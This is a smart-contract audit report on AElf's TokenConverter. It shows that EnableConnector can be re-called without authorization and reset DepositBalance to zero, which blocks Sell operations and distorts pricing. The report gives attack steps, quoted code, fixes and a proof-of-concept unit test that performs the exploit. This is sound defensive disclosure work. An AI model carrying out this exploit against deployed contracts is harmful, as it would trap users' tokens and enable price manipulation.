# Audit Report

## Title
EnableConnector Allows Re-Enabling with Zero Deposit, Corrupting DepositBalance Accounting

## Summary
The `EnableConnector` function lacks authorization checks and re-enabling protection, allowing any external user to call it on already-enabled connectors. By crafting inputs that yield zero deposit requirements, an attacker can unconditionally overwrite `DepositBalance` to zero, erasing accumulated deposits from prior Buy operations. This causes permanent DoS of Sell operations and corrupts Bancor pricing calculations.

## Finding Description

The `EnableConnector` function contains three critical security flaws that break the TokenConverter's accounting integrity:

**Flaw 1: No Authorization Check**

Unlike `UpdateConnector` which enforces controller-only access via `AssertPerformedByConnectorController()`, [1](#0-0)  the `EnableConnector` function has no authorization check whatsoever, allowing any external user to invoke it. [2](#0-1) 

**Flaw 2: No Re-Enabling Protection**

`UpdateConnector` explicitly prevents updates to enabled connectors with an assertion check, [3](#0-2)  but `EnableConnector` lacks this guard and can be called repeatedly on already-active connectors.

**Flaw 3: Unconditional DepositBalance Overwrite**

The function unconditionally assigns (not adds to) the deposit balance, erasing any previously accumulated value. [4](#0-3)  This contrasts with the `Buy` operation which correctly uses addition. [5](#0-4) 

**Attack Vector:**

When `GetNeededDeposit` calculates that `amountOutOfTokenConvert = totalSupply - balance - AmountToTokenConvert <= 0`, it returns `needDeposit = 0`. [6](#0-5) 

An attacker can trigger this by supplying `AmountToTokenConvert >= totalSupply - balance`, causing the conditional deposit transfer to be skipped while still executing the unconditional DepositBalance assignment to zero.

## Impact Explanation

**1. DepositBalance Accounting Corruption**

Buy operations accumulate base tokens in DepositBalance, which tracks the contract's reserve backing the connector. Resetting DepositBalance to zero creates a critical mismatch between the contract's actual token holdings and its internal accounting.

**2. Sell Operation Denial of Service**

The Sell function subtracts from DepositBalance using checked arithmetic. [7](#0-6)  With DepositBalance corrupted to zero, any Sell attempt throws an overflow exception. The `.Sub()` method uses checked arithmetic that throws on underflow. [8](#0-7)  This makes Sell operations permanently unavailable, trapping users' tokens.

**3. Bancor Pricing Manipulation**

`GetSelfBalance` returns DepositBalance for deposit accounts, which is used in Bancor pricing formulas. [9](#0-8)  With corrupted DepositBalance, the Bancor formula calculates incorrect prices, enabling arbitrage exploitation and unfair trades.

**4. Irreversible State Corruption**

The UpdateConnector protection prevents fixing enabled connectors, making the corruption permanent. [3](#0-2) 

## Likelihood Explanation

**Attacker Capabilities**: Any external address can call EnableConnector without authorization or approval requirements, as confirmed by test cases. [10](#0-9) 

**Attack Complexity**: MEDIUM
- Step 1: Acquire sufficient resource tokens (via market purchase or existing holdings)
- Step 2: Approve TokenConverter contract for token transfer
- Step 3: Call EnableConnector with `AmountToTokenConvert >= totalSupply - balance`
- Cost: Requires transferring (totalSupply - balance) resource tokens to the contract

**Feasibility Conditions**:
- Target connector is already enabled with accumulated DepositBalance > 0
- Attacker has access to sufficient resource tokens (feasible for moderately-funded actors on smaller tokens)
- Economic incentive exists (arbitrage profit from mispricing or competitive sabotage)

**Probability Assessment**: MEDIUM to HIGH for active connector pairs where the attack cost (acquiring and transferring resource tokens) is justified by potential gains from pricing arbitrage, DoS of competitor liquidity, or strategic manipulation.

## Recommendation

Add three critical protections to `EnableConnector`:

1. **Add Authorization Check**: Insert `AssertPerformedByConnectorController();` at the beginning of the function
2. **Add Re-Enable Protection**: Check `Assert(!fromConnector.IsPurchaseEnabled && !toConnector.IsPurchaseEnabled, "Connectors already enabled");`
3. **Use Addition Instead of Assignment**: Change line 297 to `State.DepositBalance[toConnector.Symbol] = State.DepositBalance[toConnector.Symbol].Add(needDeposit.NeedAmount);`

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_ReEnable_CorruptsDepositBalance_Test()
{
    // Setup: Create and enable a connector normally
    var tokenSymbol = "VULN";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = 1000_0000,
        To = DefaultSender,
        Symbol = tokenSymbol
    });
    
    var initialEnableInfo = new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 1000_0000
    };
    await DefaultStub.EnableConnector.SendAsync(initialEnableInfo);
    
    // Perform Buy to accumulate DepositBalance
    await DefaultStub.Buy.SendAsync(new BuyInput
    {
        Symbol = tokenSymbol,
        Amount = 500_0000,
        PayLimit = 1000_0000
    });
    
    var depositConnectorSymbol = "nt" + tokenSymbol;
    var depositBalanceBefore = (await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol })).Value;
    Assert.True(depositBalanceBefore > 0, "DepositBalance should be positive after Buy");
    
    // Attack: Re-enable with crafted input to get zero deposit
    var tokenInfo = await TokenContractStub.GetTokenInfo.CallAsync(
        new GetTokenInfoInput { Symbol = tokenSymbol });
    var contractBalance = await GetBalanceAsync(tokenSymbol, TokenConverterContractAddress);
    
    var attackEnableInfo = new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = tokenInfo.TotalSupply - contractBalance
    };
    
    // This should fail with authorization check but doesn't
    await DefaultStub.EnableConnector.SendAsync(attackEnableInfo);
    
    // Verify DepositBalance corrupted to zero
    var depositBalanceAfter = (await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol })).Value;
    Assert.Equal(0, depositBalanceAfter); // DepositBalance overwritten to 0
    
    // Verify Sell now fails with underflow
    var sellResult = await DefaultStub.Sell.SendWithExceptionAsync(new SellInput
    {
        Symbol = tokenSymbol,
        Amount = 100_0000,
        ReceiveLimit = 0
    });
    sellResult.TransactionResult.Error.ShouldContain("Overflow"); // Sub() throws on underflow
}
```

## Notes

This vulnerability demonstrates a critical authorization and state management flaw in the TokenConverter contract. The lack of authorization allows any user to manipulate the internal accounting, while the unconditional assignment pattern creates an irreversible corruption vector. The attack requires transferring resource tokens to the contract (not returned to attacker as initially claimed), making it economically costly but feasible for high-value targets or strategic attacks.

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-60)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L64-64)
```csharp
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-300)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-389)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L73-84)
```csharp
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-97)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
```

**File:** test/AElf.Contracts.TokenConverter.Tests/TokenConvertConnectorTest.cs (L377-399)
```csharp
    public async Task EnableConnector_Success_Test()
    {
        await DefaultStub.Initialize.SendAsync(new InitializeInput
        {
            FeeRate = "0.005"
        });
        var tokenSymbol = "NETT";
        await CreateTokenAsync(tokenSymbol);
        await AddPairConnectorAsync(tokenSymbol);
        await TokenContractStub.Issue.SendAsync(new IssueInput
        {
            Amount = 99_9999_0000,
            To = DefaultSender,
            Symbol = tokenSymbol
        });
        var toBeBuildConnectorInfo = new ToBeConnectedTokenInfo
        {
            TokenSymbol = tokenSymbol,
            AmountToTokenConvert = 99_9999_0000
        };
        var deposit = await DefaultStub.GetNeededDeposit.CallAsync(toBeBuildConnectorInfo);
        deposit.NeedAmount.ShouldBe(100);
        await DefaultStub.EnableConnector.SendAsync(toBeBuildConnectorInfo);
```
